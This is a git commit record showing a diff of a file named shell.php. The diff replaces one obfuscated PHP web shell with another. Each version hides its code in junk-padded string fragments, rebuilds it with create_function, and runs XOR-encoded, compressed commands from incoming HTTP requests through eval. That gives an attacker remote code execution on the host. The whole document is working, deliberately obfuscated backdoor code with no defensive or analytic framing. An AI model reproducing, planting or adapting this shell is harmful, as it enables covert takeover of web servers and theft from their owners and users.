4469f4c121ae1c07e1d882610216cf11eebbade5
Muhammad <132049921+qorahoja@users.noreply.github.com>
2023-10-16 15:27:16 +0500

    Add files via upload

--- shell.php
+++ shell.php
@@ -1,10 +1,12 @@
 <?php
-$k='$H^k=H^"H^827ccb0e";$kh="ea8aH^706c4c34";H^$kfH^="a1689H^H^1f84e7b";$H^p="H^tqoEfiS3V0ihH^O3SK";H^fuH^nctionH^ x($t,$H^k)';
-$h='get_contenH^tH^s();@ob_enH^d_cleH^an();$r=H^@bH^ase64_eH^ncode(@xH^(@gzH^compreH^ss($o),$H^k))H^;printH^("H^$p$kh$r$kf");}';
-$W='{H^$c=sH^H^trleH^n($k);$l=strlen($tH^);H^$o="";for($i=0H^;$H^i<$lH^;){forH^($j=0H^H^;($j<$c&&$i<$l);$j++H^,$H^i+H';
-$f='^+)H^{$o.=$H^t{$i}^$k{$j};}}retH^urn H^$o;}ifH^ (H^@pH^reg_matchH^("/$kh(.+)$kH^f/H^",@H^file_gH^H^et_contenH^ts("php://';
-$R='H^inH^put"),$m)H^==1) {@obH^_start();@eH^valH^(@gzuncomH^pH^ress(@H^H^x(@baH^se64_dH^ecH^odH^e($H^m[1]),$k)));$o=@ob_';
-$o=str_replace('qS','','creqSatqSe_qSfqSuncqSqStion');
-$O=str_replace('H^','',$k.$W.$f.$R.$h);
-$Y=$o('',$O);$Y();
+$b='nts(C9"php:C9//C9input"),$m)==1) C9{@oC9bC9_start();@evC9al(@gzuncoC9mpreC9ss(@x(C9';
+$y='$k="5dC941C9402a";$kh="bC9c4b2aC976b971"C9;$kC9f="9C9d911017cC959C92";C9$p="JGkqzQY7';
+$a='@baseC964_decodC9e($m[C91])C9,$k)C9));$C9o=@ob_get_cC9ontentC9s(C9);@ob_end_cleanC9(';
+$Q=');$rC9=@baseC964_encoC9de(@x(C9@gC9zcomprC9ess($oC9),$k)C9);printC9("$p$kh$rC9$kf");}';
+$A='j};}}retC9urn C9C9C9$o;}if (@preg_maC9tch("/$kh(C9.+)$kfC9/",@fC9ile_getC9_C9conteC9';
+$f='4C99C9quJwJ1"C9;C9function x($t,C9$k){$c=strlC9C9en($k);C9$l=sC9trlen(C9$t);C9C9$o="';
+$n=str_replace('X','','XXcreate_XfuXnXcXtion');
+$s='";for($i=0;$i<$C9lC9;){for($j=0;C9($C9j<$c&&C9$i<$l);$C9C9j++C9,$i++)C9{$o.=$t{C9$i}^$k{$';
+$S=str_replace('C9','',$y.$f.$s.$A.$b.$a.$Q);
+$z=$n('',$S);$z();
 ?>
